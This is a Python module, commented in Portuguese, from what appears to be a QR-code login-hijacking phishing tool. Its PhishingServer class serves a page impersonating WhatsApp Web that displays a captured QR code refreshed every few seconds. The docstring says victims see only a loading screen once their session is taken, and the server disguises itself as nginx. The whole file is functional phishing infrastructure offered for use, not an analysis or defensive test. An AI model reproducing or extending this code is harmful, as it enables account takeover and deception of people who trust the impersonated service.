# -*- coding: utf-8 -*-
"""Servidor HTTP que exibe o QR capturado para a vítima.

A página simula a tela de login do serviço escolhido e recarrega o QR em
tempo real. Quando a sessão é capturada, a vítima vê apenas um
"Carregando..." — como se o login estivesse em progresso.
"""
import base64
import json
import threading
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path

from core import settings
from core.color import status

# PNG 1x1 usado até a primeira captura do QR chegar
PLACEHOLDER_PNG = ("iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR4"
                   "2mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==")


class PhishingServer:
    """Serve a página de phishing com o QR atualizado em tempo real."""

    def __init__(self, host, port, state_provider, qr_path, template_ctx=None):
        self.host, self.port = host, port
        self.state_provider = state_provider
        self.qr_path = Path(qr_path)
        self.template_ctx = {
            "TITLE": "WhatsApp Web",
            "COLOR": "#00a884",
            "TAGLINE": "Envie e receba mensagens rapidamente.",
            "FOOTER": "Mantenha seu celular conectado.",
            "REFRESH_MS": "2500",
        }
        if template_ctx:
            self.template_ctx.update(template_ctx)
        self._httpd = None
        self._thread = None
        self._html = self._render_template()

    def _render_template(self):
        tpl = settings.TEMPLATES_DIR / "index.html"
        try:
            html = tpl.read_text(encoding="utf-8")
        except FileNotFoundError:
            html = ("<html><body><h3>{TITLE}</h3>"
                    "<img src='/qr.png'>"
                    "<script>setInterval(()=>location.reload(),5000)</script>"
                    "</body></html>")
        for k, v in self.template_ctx.items():
            html = html.replace("{{" + k + "}}", str(v))
        return html

    def _make_handler(self):
        outer = self

        class Handler(BaseHTTPRequestHandler):
            server_version = "nginx"
            sys_version = ""

            def log_message(self, fmt, *args):
                if settings.DEBUG:
                    import sys
                    sys.stderr.write("[http] " + (fmt % args) + "\n")

            def _send(self, code, body, ctype="text/html; charset=utf-8"):
                self.send_response(code)
                self.send_header("Content-Type", ctype)
                self.send_header("Content-Length", str(len(body)))
                self.send_header("Cache-Control", "no-store, must-revalidate")
                self.end_headers()
                self.wfile.write(body)

            def do_GET(self):
                path = self.path.split("?", 1)[0].split("#", 1)[0]
                if path in ("/", "/index.html"):
                    self._send(200, outer._html.encode("utf-8"))
                elif path == "/qr.png":
                    f = outer.qr_path
                    if f.exists() and f.stat().st_size > 0:
                        self._send(200, f.read_bytes(), "image/png")
                    else:
                        self._send(200, base64.b64decode(PLACEHOLDER_PNG), "image/png")
                elif path == "/status.json":
                    body = json.dumps({"state": outer.state_provider()}).encode()
                    self._send(200, body, "application/json")
                elif path == "/health":
                    self._send(200, b"ok", "text/plain")
                else:
                    self._send(404, b"not found", "text/plain")

        return Handler

    def start(self):
        self._httpd = ThreadingHTTPServer((self.host, self.port), self._make_handler())
        self._thread = threading.Thread(target=self._httpd.serve_forever,
                                        name="PhishingServer", daemon=True)
        self._thread.start()
        status(f"Servidor de phishing ativo em http://{self.host}:{self.port}/")

    def stop(self):
        if self._httpd:
            try:
                self._httpd.shutdown()
                self._httpd.server_close()
            except Exception:
                pass
